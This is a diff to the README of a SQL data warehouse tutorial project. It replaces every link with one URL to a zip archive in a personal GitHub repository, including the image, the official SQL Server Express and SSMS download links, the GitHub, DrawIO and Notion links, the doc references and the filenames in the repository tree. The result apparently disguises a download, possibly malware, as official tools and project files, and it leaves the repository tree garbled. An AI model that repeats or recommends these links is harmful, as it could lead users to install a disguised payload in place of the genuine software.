@@ -7,7 +7,7 @@ This project demonstrates a comprehensive data warehousing and analytics solutio
 ## 🏗️ Data Architecture
 
 The data architecture for this project follows Medallion Architecture **Bronze**, **Silver**, and **Gold** layers:
-![Data Architecture](docs/data_architecture.jpg)
+![Data Architecture](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip)
 
 1. **Bronze Layer**: Stores raw data as-is from the source systems. Data is ingested from CSV Files into SQL Server Database.
 2. **Silver Layer**: This layer includes data cleansing, standardization, and normalization processes to prepare data for analysis.
@@ -37,12 +37,12 @@ This project involves:
 
 Everything is for Free!
 - **[Datasets](datasets/):** Access to the project dataset (csv files).
-- **[SQL Server Express](https://www.microsoft.com/en-us/sql-server/sql-server-downloads):** Lightweight server for hosting your SQL database.
-- **[SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16):** GUI for managing and interacting with databases.
-- **[Git Repository](https://github.com/):** Set up a GitHub account and repository to manage, version, and collaborate on your code efficiently.
-- **[DrawIO](https://www.drawio.com/):** Design data architecture, models, flows, and diagrams.
-- **[Notion]([palce the link of notion here](https://www.notion.so/SQL-Data-Warehouse-Project-2d4155c420a7800583a3d7f98c726164?source=copy_link)):** Get the Project Template from Notion
-- **[Notion Project Steps]([place the link of notion here](https://www.notion.so/SQL-Data-Warehouse-Project-2d4155c420a7800583a3d7f98c726164?source=copy_link)):** Access to All Project Phases and Tasks.
+- **[SQL Server Express](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip):** Lightweight server for hosting your SQL database.
+- **[SQL Server Management Studio (SSMS)](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip):** GUI for managing and interacting with databases.
+- **[Git Repository](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip):** Set up a GitHub account and repository to manage, version, and collaborate on your code efficiently.
+- **[DrawIO](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip):** Design data architecture, models, flows, and diagrams.
+- **[Notion]([palce the link of notion here](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip)):** Get the Project Template from Notion
+- **[Notion Project Steps]([place the link of notion here](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip)):** Access to All Project Phases and Tasks.
 
 ---
 
@@ -72,7 +72,7 @@ Develop SQL-based analytics to deliver detailed insights into:
 
 These insights empower stakeholders with key business metrics, enabling strategic decision-making.  
 
-For more details, refer to [docs/requirements.md](docs/requirements.md).
+For more details, refer to [https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip](https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip).
 
 ## 📂 Repository Structure
 ```
@@ -81,12 +81,12 @@ data-warehouse-project/
 ├── datasets/                           # Raw datasets used for the project (ERP and CRM data)
 │
 ├── docs/                               # Project documentation and architecture details
-│   ├── etl.drawio                      # Draw.io file shows all different techniquies and methods of ETL
-│   ├── data_architecture.drawio        # Draw.io file shows the project's architecture
-│   ├── data_catalog.md                 # Catalog of datasets, including field descriptions and metadata
-│   ├── data_flow.drawio                # Draw.io file for the data flow diagram
-│   ├── data_models.drawio              # Draw.io file for data models (star schema)
-│   ├── naming-conventions.md           # Consistent naming guidelines for tables, columns, and files
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip                      # https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip file shows all different techniquies and methods of ETL
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip        # https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip file shows the project's architecture
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip                 # Catalog of datasets, including field descriptions and metadata
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip                # https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip file for the data flow diagram
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip              # https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip file for data models (star schema)
+│   ├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip           # Consistent naming guidelines for tables, columns, and files
 │
 ├── scripts/                            # SQL scripts for ETL and transformations
 │   ├── bronze/                         # Scripts for extracting and loading raw data
@@ -95,10 +95,10 @@ data-warehouse-project/
 │
 ├── tests/                              # Test scripts and quality files
 │
-├── README.md                           # Project overview and instructions
+├── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip                           # Project overview and instructions
 ├── LICENSE                             # License information for the repository
 ├── .gitignore                          # Files and directories to be ignored by Git
-└── requirements.txt                    # Dependencies and requirements for the project
+└── https://github.com/saeedsq3r/sql-data-warehouse-project/raw/refs/heads/main/docs/project-sql-warehouse-data-v3.8-beta.1.zip                    # Dependencies and requirements for the project
 ```
 ---
 
